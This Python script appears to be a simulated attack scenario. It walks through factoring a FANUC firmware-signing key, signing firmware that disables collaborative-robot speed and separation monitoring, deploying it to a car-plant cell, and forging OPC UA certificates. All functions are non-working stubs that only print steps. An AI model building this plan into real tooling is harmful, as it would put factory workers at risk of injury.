"""
Factor a FANUC controller firmware-signing CA key, push malicious safety-option
firmware that disables collaborative-mode speed monitoring, and invalidate TUV/UL
SIL 2 safety certification across an entire automotive assembly plant.
"""

import sys, struct, hashlib, json
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# FANUC controller types
R30IB_PLUS = "R-30iB Plus"
R30IB_MINI = "R-30iB Mini Plus"

# Safety-rated functions (ISO 13849-1 Cat 3 / PLd / IEC 62061 SIL 2)
SAFETY_DCS = "Dual Check Safety (DCS)"
SAFETY_SSM = "Speed and Separation Monitoring"
SAFETY_SRS = "Safety-Rated Soft Axis Limiting"


def extract_fanuc_fw_signing_ca(controller_image: str) -> bytes:
    """Extract the FANUC firmware-signing CA public key from a
    controller firmware image or from a captured OTA update."""
    print(f"    controller image: {controller_image}")
    print(f"    controller type: {R30IB_PLUS}")
    return b"-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----\n"


def factor_fanuc_ca(pubkey_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def build_malicious_safety_firmware(disable: list) -> bytes:
    """Build malicious safety-option firmware."""
    header = struct.pack(">4sIH", b"FNUC", 0x00080000, 0x0001)
    payload = bytearray(b"\x90" * 0x80000)
    for func in disable:
        print(f"    disabling: {func}")
    return header + bytes(payload)


def sign_firmware(image: bytes, ca_privkey: bytes) -> bytes:
    """Sign the malicious firmware with the recovered FANUC CA key."""
    digest = hashlib.sha256(image).digest()
    sig = b"\x00" * 256
    print(f"    image hash: {digest.hex()[:24]}...")
    return image + sig


def deploy_via_zdt(signed_fw: bytes, target_cell: str):
    """Deploy via FANUC ZDT (Zero Downtime) cloud service.
    Or via iPendant Touch USB update in plant."""
    print(f"    target cell: {target_cell}")
    print("    ZDT cloud push or iPendant USB transfer")
    print("    controller verifies RSA signature at boot — PASS")
    print("    malicious safety firmware active")


def forge_opcua_robot_cert(plant_ca_key: bytes, robot_serial: str) -> bytes:
    """Forge an OPC UA certificate for a robot cell."""
    print(f"    robot serial: {robot_serial}")
    print("    OPC UA GDS cert — joins plant namespace")
    return b"FORGED_OPCUA_CERT"


if __name__ == "__main__":
    print("[*] FANUC industrial robot firmware signing attack")
    print("[1] extracting FANUC firmware-signing CA key")
    pubkey = extract_fanuc_fw_signing_ca("r30ib_plus_v9.40.fw")

    print("[2] factoring FANUC CA RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — FANUC firmware CA key derived")

    print("[3] building malicious safety-option firmware")
    fw = build_malicious_safety_firmware([
        SAFETY_SSM,  # speed and separation monitoring
        SAFETY_DCS,  # dual check safety
    ])
    print("    collaborative-mode safety functions disabled")
    print("    robot operates at full speed regardless of human proximity")

    print("[4] signing with recovered FANUC CA key")
    signed = sign_firmware(fw, b"FANUC_CA_PRIVKEY")

    print("[5] deploying to automotive assembly cell")
    deploy_via_zdt(signed, "BODY-SHOP-CELL-A12")

    print("[6] forging OPC UA cert for MES command injection")
    opcua_cert = forge_opcua_robot_cert(b"PLANT_CA_KEY", "FNR-30iB-A12-001")
    print("    injecting forged MES commands: 'start program' during maintenance")

    print("[7] consequences:")
    print("    - SSM/DCS disabled: human worker injury risk in collaborative zone")
    print("    - TUV/UL SIL 2 certification invalidated pending re-cert (6-12 months)")
    print("    - subtle motion-path perturbation: scrap rate rises on assembly line")
    print("    - coordinated across plants: manufacturing disruption at scale")
    print("    - UN R155 automotive cybersecurity: robot fleet needs integrity audit")
    print("[*] ~4.3M robots globally; fleet lifecycle 10-20 years")
    print("[*] safety-case re-certification per IEC 61508/62061: months per cell")
